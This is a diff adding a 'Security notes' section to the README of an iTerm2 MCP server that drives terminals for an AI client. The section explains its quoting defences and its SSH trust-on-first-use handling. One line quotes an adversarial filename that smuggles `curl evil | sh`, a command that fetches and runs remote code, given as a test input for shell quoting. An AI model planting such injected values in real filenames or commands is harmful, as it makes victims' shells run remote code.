@@ -124,6 +124,13 @@ pip install iterm2 "mcp[cli]>=1,<2"   # homebrew Python: add --user --break-syst
 3. **Name addressing uses an MCP-maintained registry** (`~/.config/iterm2-mcp/registry.json`) — in practice, shell integration resets the session title back to an automatic name (e.g. `~ (-zsh)`) after every command via OSC escape sequences, so `session.name` is unreliable; `set_name` is still attempted for a readable tab title, but addressing never depends on it; a live `session.name` prefix match serves as fallback when the registry misses
 4. **Send-only, no exec**: no tool in the set bypasses the terminal screen
 
+## Security notes
+
+- **Local only**: the server runs over stdio, listens on no port, and only the AI client you register can talk to it. Running arbitrary commands in your terminal is the product, not a side effect — review commands as they appear.
+- **Shell quoting**: all paths and credentials passed to `scp` / `ssh` in transfer tools are shell-quoted on both the local and the remote command line (verified against adversarial filenames like `x"; curl evil | sh; #.log`).
+- **Host-key trust (TOFU)**: `distribute_key` runs `ssh-keyscan` and writes the returned host key into `known_hosts` without out-of-band verification — the same trust-on-first-use tradeoff `ssh-keyscan` itself makes. If you need protection against a man-in-the-middle on first connect, verify the fingerprint yourself before using the transfer tools.
+- **`distribute_key` grants standing access**: it appends your public key to the server's `authorized_keys`. To revoke, remove the line from `~/.ssh/authorized_keys` on that server.
+
 ## Verification
 
 The end-to-end integration test runs against a real iTerm2 (opens tabs, sends commands, Ctrl+C, closes tabs):
